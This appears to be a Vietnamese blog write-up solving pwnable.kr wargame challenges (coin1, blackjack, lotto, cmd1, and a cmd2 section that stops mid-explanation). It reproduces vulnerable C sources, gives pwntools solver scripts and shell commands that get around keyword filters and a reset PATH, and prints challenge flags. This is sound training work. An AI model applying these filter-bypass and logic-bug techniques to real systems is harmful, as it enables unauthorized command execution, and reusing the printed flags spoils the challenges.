---
title: PWNABLE.KR - Phần 2
date: 2026-02-26 21:38:06
tag: ['PWN', 'Writeup']
cover: /img/post/writeup/pwnable-kr/thumbnail.png
category: ['Writeup']
author:
    - Vuk3r
---
Đây là phần 2 của series [Pwnable.kr](http://Pwnable.kr) của mình. Phần này sẽ là các challenge còn lại của Toddler's Bottle. No need milk anymore, baby grow up !

# coin1

## Description

```c
Mommy, I wanna play a game!

ssh coin1@pwnable.kr -p2222 (pw: guest)
```

## Source

### readme

```c
nc 0 9007 to get flag!
```

## Solution

nc tới địa chỉ thì ta sẽ bắt đầu được game. Luật game cơ bản là tìm đúng đồng xu trong N đồng xu, và người chơi có C dự đoán và thêm 1 lần nữa để nhập đáp án. Với mỗi lần tìm được thì tính là 1 xu, và ta cần tìm được 100 đồng tương đương với chơi 100 lần như thế. Với mỗi vòng chỉ được 60s. Với mỗi lần hỏi thì sẽ trả về giá trị của tổng các đồng xu đó, với xu đúng thì là 9 và 10 với các xu còn lại.

Theo mình để ý thì C nó sẽ tầm từ 6 tới 10 lần, tỉ lệ thuận với N. Thì nó chỉ là 1 game đoán số thôi, giả sử mình bảo ai đó nghĩ tới 1 số trong khoảng 0 tới 100, và mình sẽ đoán bằng cách hỏi rằng số đó có lớn hơn 50 không, rồi lớn hơn 75 không, rồi cứ lần lượt như thế thì mình sẽ tìm được số người kia đang nghĩ. Trong giải thuật thì đây là một cách tìm tương tự như Cây Nhị Phân.

Vì chương trình cho ta nhập vào nhiều số nên nếu ta nhập được toàn bộ số của khoảng ta muốn hỏi thì chương trình trả về được rằng trong khoảng đó có số cần tìm hay không.

ví dụ N=10 và số cần tìm là 5

nhập : 1 2 3 4 5 ⇒ chương trình trả về 49 vì đồng 1, 2, 3, 4 là là đồng bình thường nên nó sẽ là 10, còn đồng 5 là đồng cần tìm nên nó là 9 ⇒ tổng là 49

Cái khó ở đây là thời gian limit của mỗi đợt là 60s nên ta cần viết script.

Ta được phép viết script python tại thư mục `/tmp` và dùng lệnh `echo <payload> > solve.py`

Vậy thì script của ta nó sẽ có :
[+] Một vòng lặp lặp 100 lần tương đương 100 lần chơi.

[+] Một vòng lặp Lặp C+1 lần để chơi cho hết lượt đoán và 1 lần nhập đáp án.

[+] Một đoạn code gen các chuỗi để nhập vào.

~~Mình lười giải thích script quá nên~~ Script như bên dưới:

## Payload

```python
from pwn import *
import sys
import math

p = remote('0', int(9007))

context.log_level = 'DEBUG'
context.arch = 'amd64'

p.recvuntil(b'Ready? starting in 3 sec... -\n')
coin = 0
while(coin<=100): # vòng lặp cho 100 lần chơi
    log.info(f'current coin : {coin}')
    p.recvuntil(b'N=')
    N = int(p.recvuntil(b' ',drop=True).decode())
    p.recvuntil(b'C=')
    C = int(p.recvline().decode())
    start  = 0
    end = N # lần đầu tiên LUÔN lấy từ khoảng 0 tới khoảng N/2
    mid = start + math.ceil((start+end)/2)
    while(C>=0): 
        no_sus=0 # tính toán input nhập vào, ví dụ nhập 3 số thì nếu như không có đồng sus sẽ là : no_sus*10
        payload = ''
        mid = math.ceil((start+end)/2)
        for i in range(int(start),int(mid)): 
            no_sus=no_sus+1
            payload += f'{i} '
        p.sendline(payload)
        check = (p.recvline()).decode()
        if('Correct' in check):
            coin = coin + 1
            break
        check = int(check)
        
        no_sus = no_sus * 10
        log.info(f'check: {check} | no_sus: {no_sus}')
        log.info(f'start : {start}')
        log.info(f'end : {end}')
        if(check == no_sus): # nếu như đầu ra giống số dự tính thì đồng sus ở khoảng còn lại
            start = mid
        else:
            end = mid
        C = C-1

p.interactive()
```

# blackjack

## Description

```c
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?

ssh blackjack@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
//// Programmer: Vladislav Shulman
// Final Project
// Blackjack
 
// Feel free to use any and all parts of this program and claim it as your own work
 
//FINAL DRAFT
 
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <time.h>                //Used for srand((unsigned) time(NULL)) command
 
#define spade 'S'                 //Used to print spade symbol
#define club 'C'                  //Used to print club symbol
#define diamond 'D'               //Used to print diamond symbol
#define heart 'H'                 //Used to print heart symbol
#define RESULTS "Blackjack.txt"  //File name is Blackjack
 
//Global Variables
int k;
int l;
int d;
int won;
int loss;
int cash = 500;
int bet;
int random_card;
int player_total=0;
int dealer_total;
 
//Function Prototypes
int clubcard();      //Displays Club Card Image
int diamondcard();   //Displays Diamond Card Image
int heartcard();     //Displays Heart Card Image
int spadecard();     //Displays Spade Card Image
int randcard();      //Generates random card
int betting();       //Asks user amount to bet
void asktitle();     //Asks user to continue
void rules();        //Prints "Rules of Vlad's Blackjack" menu
void play();         //Plays game
void dealer();       //Function to play for dealer AI
void stay();         //Function for when user selects 'Stay'
void cash_test();    //Test for if user has cash remaining in purse
void askover();      //Asks if user wants to continue playing
void fileresults();  //Prints results into Blackjack.txt file in program directory
 
//Main Function
int main(void)
{
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    int choice1;
    printf("\n");
    printf("\n");
    printf("\n");
    printf("\n              222                111                            ");
    printf("\n            222 222            11111                              ");
    printf("\n           222   222          11 111                            "); 
    printf("\n                222              111                               "); 
    printf("\n               222               111                           ");   
    printf("\n");
    printf("\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  
    printf("\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);            
    printf("\n%c    %c    %c%c          %c    %c     %c          %c  %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                        
    printf("\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      
    printf("\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       
    printf("\n%c     %c   %c%c         %c      %c    %c          %c   %c               ", club, club, spade, spade, diamond, diamond, heart, club, club);                                         
    printf("\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             ", club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            
    printf("\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     
    printf("\n");     
    printf("\n                        21                                   ");
     
    printf("\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     
    printf("\n        %c%c        %c  %c       %c     %c   %c   %c              ", diamond, diamond, heart, heart, club, club, spade, spade);                                      
    printf("\n        %c%c       %c    %c     %c          %c  %c               ", diamond, diamond, heart, heart, club, spade, spade);                                           
    printf("\n        %c%c       %c %c%c %c     %c          %c %c              ", diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     
    printf("\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                
    printf("\n        %c%c      %c      %c    %c          %c   %c               ", diamond, diamond, heart, heart, club, spade, spade);                                                                               
    printf("\n     %c  %c%c     %c        %c    %c     %c   %c    %c             ", diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               
    printf("\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        
    printf("\n");  
    printf("\n         222                     111                         ");
    printf("\n        222                      111                         ");
    printf("\n       222                       111                         ");
    printf("\n      222222222222222      111111111111111                       ");
    printf("\n      2222222222222222    11111111111111111                         ");
    printf("\n");
    printf("\n");
     
    asktitle();
     
    printf("\n");
    printf("\n");
    return(0);
} //end program
 
void asktitle() // Function for asking player if they want to continue
{
    char choice1;
    int choice2;
     
     printf("\n                 Are You Ready?");
     printf("\n                ----------------");
     printf("\n                      (Y/N)\n                        ");
     scanf("\n%c",&choice1);
 
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu.
    { 
	    printf("\033[2J\033[1;1H");
            printf("\nEnter 1 to Begin the Greatest Game Ever Played.");
            printf("\nEnter 2 to See a Complete Listing of Rules.");
            printf("\nEnter 3 to Exit Game. (Not Recommended)");
            printf("\nChoice: ");
            scanf("%d", &choice2); // Prompts user for choice
            if((choice2<1) || (choice2>3)) // If invalid choice entered
            {
                printf("\nIncorrect Choice. Please enter 1, 2 or 3\n");
                scanf("%d", &choice2);
            }
            switch(choice2) // Switch case for different choices
            {   
                case 1: // Case to begin game
                   printf("\033[2J\033[1;1H");                    
                   play();                                       
                   break;
                    
                case 2: // Case to see rules
                   printf("\033[2J\033[1;1H");
                   rules();
                   break;
                    
                case 3: // Case to exit game
                   printf("\nYour day could have been perfect.");
                   printf("\nHave an almost perfect day!\n\n");                   
                   exit(0);
                   break;
                    
                default:
                   printf("\nInvalid Input");
            } // End switch case
    } // End if loop
    
             
 
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program
    {
        printf("\nYour day could have been perfect.");
        printf("\nHave an almost perfect day!\n\n");
        printf("\033[2J\033[1;1H");
        exit(0);
    }
     
    return;
} // End function
 
void rules() //Prints "Rules of Vlad's Blackjack" list
{
     char choice1;
     int choice2;
      
     printf("\n           RULES of VLAD's BLACKJACK");
     printf("\n          ---------------------------");
     printf("\nI.");
     printf("\n     Thou shalt not question the odds of this game.");
     printf("\n      %c This program generates cards at random.", spade);
     printf("\n      %c If you keep losing, you are very unlucky!\n", diamond);
      
     printf("\nII.");
     printf("\n     Each card has a value.");
     printf("\n      %c Number cards 1 to 10 hold a value of their number.", spade);
     printf("\n      %c J, Q, and K cards hold a value of 10.", diamond);
     printf("\n      %c Ace cards hold a value of 11", club);
     printf("\n     The goal of this game is to reach a card value total of 21.\n");
      
     printf("\nIII.");
     printf("\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.");
     printf("\n      %c Staying will keep you safe, hitting will add a card.", spade);
     printf("\n     Because you are competing against the dealer, you must beat his hand.");
     printf("\n     BUT BEWARE!.");
     printf("\n      %c If your total goes over 21, you will LOSE!.", diamond);
     printf("\n     But the world is not over, because you can always play again.\n");
     printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade);
     printf("\nWould you like to go the previous screen? (I will not take NO for an answer)");
     printf("\n                  (Y/N)\n                    ");

     scanf("\n%c",&choice1);
      
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu.
    { 
            printf("\033[2J\033[1;1H");
            asktitle();
    } // End if loop
    
             
 
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes
    {
        printf("\033[2J\033[1;1H");
        printf("\n                 I told you so.\n");
        asktitle();
    }
     
    return;
} // End function
 
int clubcard() //Displays Club Card Image
{  
   
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", club);
    printf("-------\n");
    }
     
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  J  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    }
     
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  A  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
 
             k=1;
         }
    }
     
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  Q  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Club Card
    printf("-------\n");
    printf("|%c    |\n", club);
    printf("|  K  |\n");
    printf("|    %c|\n", club);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;           
}// End function
 
int diamondcard() //Displays Diamond Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", diamond);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  J  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  A  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  Q  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Diamond Card
    printf("-------\n");
    printf("|%c    |\n", diamond);
    printf("|  K  |\n");
    printf("|    %c|\n", diamond);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
}// End function
 
int heartcard() //Displays Heart Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart); 
    printf("|  %d  |\n", k);
    printf("|    %c|\n", heart);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  J  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  A  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  Q  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Heart Card
    printf("-------\n");
    printf("|%c    |\n", heart);
    printf("|  K  |\n");
    printf("|    %c|\n", heart);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
} // End Function
 
int spadecard() //Displays Spade Card Image
{
     
    srand((unsigned) time(NULL)); //Generates random seed for rand() function
    k=rand()%13+1;
     
    if(k<=9) //If random number is 9 or less, print card with that number
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  %d  |\n", k);
    printf("|    %c|\n", spade);
    printf("-------\n");
    }
     
    if(k==10) //If random number is 10, print card with J (Jack) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  J  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    }
     
    if(k==11) //If random number is 11, print card with A (Ace) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  A  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    if(player_total<=10) //If random number is Ace, change value to 11 or 1 depending on dealer total
         {
             k=11;
         }
          
         else
         {
             k=1;
         }
    }
     
    if(k==12) //If random number is 12, print card with Q (Queen) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  Q  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    k=10; //Set card value to 10
    }
     
    if(k==13) //If random number is 13, print card with K (King) on face
    {
    //Spade Card
    printf("-------\n");
    printf("|%c    |\n", spade);
    printf("|  K  |\n");
    printf("|    %c|\n", spade);
    printf("-------\n");
    k=10; //Set card value to 10
    }
    return k;
} // End Function
 
int randcard() //Generates random card
{
                
     srand((unsigned) time(NULL)); //Generates random seed for rand() function
     random_card = rand()%4+1;
      
     if(random_card==1)
     {   
         clubcard();
         l=k;
     }
      
     if(random_card==2)
     {
         diamondcard();
         l=k;
     }
      
     if(random_card==3)
     {
         heartcard();
         l=k;
     }
          
     if(random_card==4)
     {
         spadecard();
         l=k;
     }    
     return l;
} // End Function   

 
void play() //Plays game
{
      
     int p=0; // holds value of player_total
     int i=1; // counter for asking user to hold or stay (aka game turns)
     char choice3;
      
     cash = cash;
     cash_test();
     printf("\nCash: $%d\n",cash); //Prints amount of cash user has
     randcard(); //Generates random card
     player_total = p + l; //Computes player total
     p = player_total;
     printf("\nYour Total is %d\n", p); //Prints player total
     dealer(); //Computes and prints dealer total
     betting(); //Prompts user to enter bet amount
        
     while(i<=21) //While loop used to keep asking user to hit or stay at most twenty-one times
                  //  because there is a chance user can generate twenty-one consecutive 1's
     {
         if(p==21) //If user total is 21, win
         {
             printf("\nUnbelievable! You Win!\n");
             won = won+1;
             cash = cash+bet;
             printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
             dealer_total=0;
             askover();
         }
      
         if(p>21) //If player total is over 21, loss
         {
             printf("\nWoah Buddy, You Went WAY over.\n");
             loss = loss+1;
             cash = cash - bet;
             printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
             dealer_total=0;
             askover();
         }
      
         if(p<=21) //If player total is less than 21, ask to hit or stay
         {         
             printf("\n\nWould You Like to Hit or Stay?");
              
             scanf("%c", &choice3);
             while((choice3!='H') && (choice3!='h') && (choice3!='S') && (choice3!='s')) // If invalid choice entered
             {                                                                           
                 printf("\n");
                 printf("Please Enter H to Hit or S to Stay.\n");
                 scanf("%c",&choice3);
             }
 
             if((choice3=='H') || (choice3=='h')) // If Hit, continues
             { 
                 randcard();
                 player_total = p + l;
                 p = player_total;
                 printf("\nYour Total is %d\n", p);
                 dealer();
                  if(dealer_total==21) //Is dealer total is 21, loss
                  {
                      printf("\nDealer Has the Better Hand. You Lose.\n");
                      loss = loss+1;
                      cash = cash - bet;
                      printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                      dealer_total=0;
                      askover();
                  } 
      
                  if(dealer_total>21) //If dealer total is over 21, win
                  {                      
                      printf("\nDealer Has Went Over!. You Win!\n");
                      won = won+1;
                      cash = cash+bet;
                      printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
                      dealer_total=0;
                      askover();
                  }
             }
             if((choice3=='S') || (choice3=='s')) // If Stay, does not continue
             {
                printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total);
                stay();
             }
          }
             i++; //While player total and dealer total are less than 21, re-do while loop 
     } // End While Loop
} // End Function
 
void dealer() //Function to play for dealer AI
{
     int z;
      
     if(dealer_total<17)
     {
      srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function
      z=rand()%13+1;
      if(z<=10) //If random number generated is 10 or less, keep that value
      {
         d=z;
          
      }
      
      if(z>11) //If random number generated is more than 11, change value to 10
      {
         d=10;
      }
      
      if(z==11) //If random number is 11(Ace), change value to 11 or 1 depending on dealer total
      {
         if(dealer_total<=10)
         {
             d=11;
         }
          
         else
         {
             d=1;
         }
      }
     dealer_total = dealer_total + d;
     }
           
     printf("\nThe Dealer Has a Total of %d", dealer_total); //Prints dealer total
      
} // End Function 
 
void stay() //Function for when user selects 'Stay'
{
     dealer(); //If stay selected, dealer continues going
     if(dealer_total>=17)
     {
      if(player_total>=dealer_total) //If player's total is more than dealer's total, win
      {
         printf("\nUnbelievable! You Win!\n");
         won = won+1;
         cash = cash+bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
      if(player_total<dealer_total) //If player's total is less than dealer's total, loss
      {
         printf("\nDealer Has the Better Hand. You Lose.\n");
         loss = loss+1;
         cash = cash - bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
      if(dealer_total>21) //If dealer's total is more than 21, win
      {
         printf("\nUnbelievable! You Win!\n");
         won = won+1;
         cash = cash+bet;
         printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss);
         dealer_total=0;
         askover();
      }
     }
     else
     {
         stay();
     }
      
} // End Function
 
void cash_test() //Test for if user has cash remaining in purse
{
     if (cash <= 0) //Once user has zero remaining cash, game ends and prompts user to play again
     {
        printf("You Are Bankrupt. Game Over");
        cash = 500;
        askover();
     }
     if (cash > 1000000){
     	FILE* fp=fopen("flag", "r");
	char buf[100];
	memset(buf, 0, 100);
	fread(buf, 1, 100, fp);
	printf("%s\n", buf);
	fclose(fp);
     }
} // End Function
 
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);
 
 if (bet > cash) //If player tries to bet more money than player has
 {
        printf("\nYou cannot bet more money than you have.");
        printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
 
void askover() // Function for asking player if they want to play again
{
    char choice1;
         
     printf("\nWould You Like To Play Again?");
     printf("\nPlease Enter Y for Yes or N for No\n");
     scanf("\n%c",&choice1);
 
    while((choice1!='Y') && (choice1!='y') && (choice1!='N') && (choice1!='n')) // If invalid choice entered
    {                                                                           
        printf("\n");
        printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n");
        scanf("%c",&choice1);
    }
 
 
    if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue.
    { 
            printf("\033[2J\033[1;1H");
            play();
    }
  
    else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program
    {
        fileresults();
        printf("\nBYE!!!!\n\n");
        printf("\033[2J\033[1;1H");
        exit(0);
    }
    return;
} // End function
 
void fileresults() //Prints results into Blackjack.txt file in program directory
{
     return;
} // End Function

```

## Solution

Bài này mình giải hơn mất não, chỉ cần biết là nó sẽ luôn thua nên tiền cược mình nhồi số âm vào và nó vô tình dính lỗi `integer overflow` nên tiền nó tăng lên. Thế là lấy được flag.

# lotto

## Description

```c
Mommy! I made a lotto program for my homework.
do you want to play?

ssh lotto@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		setregid(getegid(), getegid());
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}

```

## Solution

Cái bug ở bài này đó là logic bị sai khi nó đem so toàn bộ các byte của chuỗi vừa được lấy random đem so với toàn bộ byte của chuỗi ta nhập vào, ví dụ `rand='123456'`và `input=’111111’` thì với input là 6 số giống nhau, qua vòng lặp trên biến `match` kiểu gì cũng tăng lên được, nên ta sẽ bruteforce với hi vọng sẽ có 1 byte nào đó sẽ match với 1 byte trong `rand`, khoảng byte được rand cũng không nhiều vì nó sẽ từ 1 → 45.

## Payload

payload là mình solve local để chắc chắn idea đúng. khi đó thì mình làm thủ công trên server bằng cách spam chuỗi `‘!!!!!!’` vào input, vài lần là được.

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process('./' + sys.argv[1])
    e = ELF('./' + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
'''
)
else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

while(1):
    payload = b'\x01'*6
    p.sendlineafter(b'3. Exit', b'1')
    p.sendlineafter(b'Submit your 6 lotto bytes :',payload)
p.interactive()

# !!!!!
# Sorry_mom_1_Forgot_to_check_duplicates
```

# cmd1

## Description

```c
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

## Source

```c
#include <stdio.h>
#include <string.h>

int filter(char *cmd)
{
	int r = 0;
	r += strstr(cmd, "flag") != 0;
	r += strstr(cmd, "sh") != 0;
	r += strstr(cmd, "tmp") != 0;
	return r;
}
int main(int argc, char *argv[], char **envp)
{
	putenv("PATH=/thankyouverymuch");
	if (filter(argv[1]))
		return 0;
	setregid(getegid(), getegid());
	system(argv[1]);
	return 0;
}
```

## Solution

Cách vận hành của chương trình là set biến môi trường thành 1 đường dẫn không tồn tại là `/thankyouverymuch` sau đó filter `argv[1]` và thực thi. Câu lệnh `putenv`. Mục tiêu ta là bypass filter và path môi trường. Thì với một lệnh được thực thi 1 cách bình thường thì nó sẽ tự động lấy PATH môi trường để tìm nơi chứa câu lệnh đó. Ví dụ với `ls` sẽ thành `/usr/bin/ls`. Muốn biết đường dẫn của câu lệnh ở đâu trên hệ thống thì chỉ cần dùng lệnh `which` :

```c
cmd1@ubuntu:~$ which ls
/usr/bin/ls
```

Vậy thì với input đầu vào ta chỉ cần dùng đường dẫn tuyệt đối thì hệ thống sẽ gọi trực tiếp tới đó và tránh được PATH cố định đã bị cố định.

```c
cmd1@ubuntu:~$ ./cmd1 ls
sh: 1: ls: not found
cmd1@ubuntu:~$ ./cmd1 /usr/bin/ls
cmd1  cmd1.c  flag
```

Tới tránh filter câu lệnh có `flag` thì ta chỉ cần dùng wildcard * là được. Mình thì cứ giã `cat *` là đọc full :))) Còn không thì chuyên nghiệp hơn thì như dưới :

```c
cmd1@ubuntu:~$ ./cmd1 "/usr/bin/cat *fl*"
PATH_environment?_Now_I_really_g3t_it,_mommy!
```

# cmd2

## Description

```c
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

## Source

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	setregid(getegid(), getegid());
	
	system( argv[1] );
	return 0;
}

```

## Solution

Câu này khoai hơn, nó filter cả `/` và `export` nên coi như không khôn lỏi như trên được. Do đó ta cần dùng tới câu lệnh `command` - Được tích hợp sẵn theo tiêu chuẩn POSIX nên mọi shell sẽ có lệnh này. Thì thực ra trong shell có những module được builtin - Có nghĩa là gắn liền và tích hợp vào shell, thì ngoài lệnh `command` được đề cập ở trên thì có những thứ khác như đường dẫn tiêu chuẩn cũng tính hợp vào shell, đó là `/bin:/usr/bin`. GIúp cho việc thực thi lệnh chuẩn nhất có thể cho dù có đổi bao nhiêu path đi chăng nữa. Một từ khóa giải quyết toàn bộ vấn đề.

```c
